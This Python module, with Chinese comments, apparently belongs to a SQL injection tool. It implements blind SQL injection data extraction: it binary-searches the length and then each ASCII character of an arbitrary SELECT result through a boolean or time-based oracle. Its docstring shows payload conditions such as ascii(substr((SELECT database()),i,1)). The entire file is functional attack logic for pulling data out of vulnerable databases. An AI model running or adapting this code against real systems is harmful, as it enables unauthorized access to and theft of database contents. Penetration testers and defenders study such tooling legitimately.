"""盲注提取：对 Oracle 提问，二分猜出每个字符。

    先猜长度： length((SELECT database())) >= mid
    再猜字符： ascii(substr((SELECT database()),i,1)) > mid

两种提问器的用法完全一样（oracle.ask(条件) -> 真假），
所以布尔盲注和时间盲注共用这一套提取代码，差别只在取出方式。

ASCII 区间取 [1,127]：可打印字符全覆盖，且比 255 少一次请求。
"""
from conditions.oracle import BooleanOracle, TimeOracle  # noqa: F401  (类型说明)


def _blind_length(oracle, select_sql: str, max_len: int, stage: str = "blind_length") -> int:
    """二分猜 ((select_sql)) 的长度，范围 [0, max_len]。

    用 >= 而不是 >：找最大的 n 使 length>=n 成立，结果正好等于长度。
    """
    d = oracle.dialect
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle.ask(d.ge(d.length(f"({select_sql})"), mid), stage=stage):
            lo = mid
        else:
            hi = mid - 1
    return lo


def blind_value(oracle, select_sql: str, max_len: int = 1024,
                progress: bool = False) -> str:
    """盲注提取一条标量 SELECT 的完整值。"""
    d = oracle.dialect
    n = _blind_length(oracle, select_sql, max_len)
    if n == 0:
        return ""

    chars = []
    for i in range(1, n + 1):
        lo, hi = 1, 127
        while lo < hi:
            mid = (lo + hi) // 2
            cond = d.gt(f"ascii({d.substr(f'({select_sql})', i, 1)})", mid)
            if oracle.ask(cond, stage="blind_char"):
                lo = mid + 1
            else:
                hi = mid
        chars.append(chr(lo) if lo > 0 else "")
        if progress and i % 10 == 0:
            print(f"    ... 盲注进度 {i}/{n}")
    return "".join(chars)
